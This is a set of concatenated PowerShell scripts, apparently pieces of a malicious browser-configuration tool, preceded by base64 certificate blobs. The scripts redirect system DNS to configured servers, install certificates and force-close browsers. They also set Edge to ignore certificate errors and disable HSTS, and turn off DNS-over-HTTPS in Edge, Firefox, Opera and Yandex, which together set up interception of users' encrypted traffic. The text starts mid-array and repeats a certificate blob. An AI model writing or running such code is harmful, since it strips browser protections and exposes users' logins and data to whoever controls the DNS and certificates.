'TVRZ+FE97vZKwx7eMgQ4JUFkbYixbYUaBBWRjddJVjdXwtQgaKaXxXSq/C9f7/DEH7sAVHAGZK2Nszn2+VkgJvwzffqsbP6qwe5acg/3dtYpLG5jh1vVsqiL5hUWmhUywLrKH+17OfR5YicN/Lr+U9cZy2x12CtzXyeXtwrGxHh4+IvS/klkovmyeUYaKsZrHWiMNNxk'+ 
'bfk3yXUeBd90wJO37yU3zQGn9uAwcyCHnzcJlNSY4oiAxErOe/FlpMFwFElcgzqVxF0KgsM6s34Q3/8eRTi4XcQfuw4INSjQfMxk7LMF5OiE8BHiCDGlaFsUkdFu+j5xP3//rvMq+CRIH7uyFfbVgT/Y1gQf/hQN8z309rN9I0kz7ZOfkWBRrdJP4yEFQ57Tea7brcmx'+ 
'5edq/0f35VXLkuX+kONU14mqJBYskV477YqsI+rLUbU0UHS5FZbp1LFckr5S8MhXNpg7wIKulhLOOk3gHdWT2WsSbpsV/DhAQzdRBCQo+HUEnhYAFM80tBkFrlGaq2HEmEZoI6lK2Dnzx57mhOB6lVQZg6q3JN6BeFU6GauAbwLCK7ULfCMArUfmDp3Lwbc1AzbHkj9J'+ 
'JHoF2oTfCofREU6TUj7KP3l2eOKup82+F8T/+GtQMeVsmQH9JLBRHM40id7173XIVfdtX2L/HpFf0/GRVy28D/7xBbBazuj4WsxasXEKyEDG8yqd6fa5X6dUHeXxpLoE4vOoMm5GxP2e3bjIaF4Nhlxj5uGpaZ0fOC6ve/PopgCMeXS1LFz0oe3ui1kvpXkeO1giJxpu'+ 
'aTjA1dNn8jUJRdQgfUl1ZZoNBceiR3B4JoU2+9cxUSKn9+WqmwvXHj453ToQw+MlMS1eQJTmd1uDkdO2hY3t8VpY9bcRe1gHgCiLpOFH1Donzn1HKwRihKRvsd8NlSV7sgiaCCCTViEFhuztuf6aocna7xLGBFzgI9dMXQWwbvB4G8A57+3WYtLHZDDeYxxUU3SljQSM'+ 
'yVhcLpjVlmj19hHukuPe4VGS21mb3dZBLNcXXti8PPsazipyGnT/f0+SKQCg+f1L50HRfI/MotelTvYt1rEBwBhy1jHTFZiBW0kdncgbhLVIgM1UrAl8pqSfLFE7SO7D23Go6Gmromvq/TA7MB8wBwYFKw4DAhoEFLYUpFmzfA5bac3243X5ex1f6OjKBBRT/3Q/tXzs'+ 
'pDLDKu+todz6BG7rOAICB9A='
'test.com'='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'+ 
'pDLDKu+todz6BG7rOAICB9A='
}

. .\Consts.ps1

function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            Write-Output "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        Write-Error "An error occurred: $_"
    }
}
function ConfigureEdge {
    $edgeKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    
    if (-not (Test-Path $edgeKeyPath)) {
        New-Item -Path $edgeKeyPath -Force | Out-Null
    }
    
    $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
    if (-not (Test-Path $commandLinePath)) {
        New-Item -Path $commandLinePath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    
    Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
}
. ./utils.ps1

function ConfigureFireFox 
{
    Set-FirefoxRegistry -KeyPaths @(
        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
    ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)

    foreach ($dir in Get-EnvPaths) 
    {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

        try 
        {
            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                $null = New-Item -Path $path -ItemType File
                Add-Content -Path $path -Value $UserJSContent
            }
        }
        catch 
        {
            Write-Error "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                Write-Error "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        Write-Error "Error accessing or modifying registry: $_"
    }
}
. ./utils.ps1

function ConfigureOpera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Opera settings in $filePath"
}
. ./consts.ps1
. ./utils.ps1
. ./dnsman.ps1
. ./chrome.ps1
. ./chrome.uBlock.ps1
. ./edge.ps1
. ./yandex.ps1
. ./opera.ps1
. ./firefox.ps1
. ./cert.ps1

function main {
    Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
    ConfigureCertificates
    ConfigureChrome
    ConfigureEdge
    ConfigureYandex
    ConfigureFireFox
    ConfigureOpera
    ConfigureChromeUblock
}

main
function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}
. ./utils.ps1

function ConfigureYandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Yandex settings in $filePath"
}

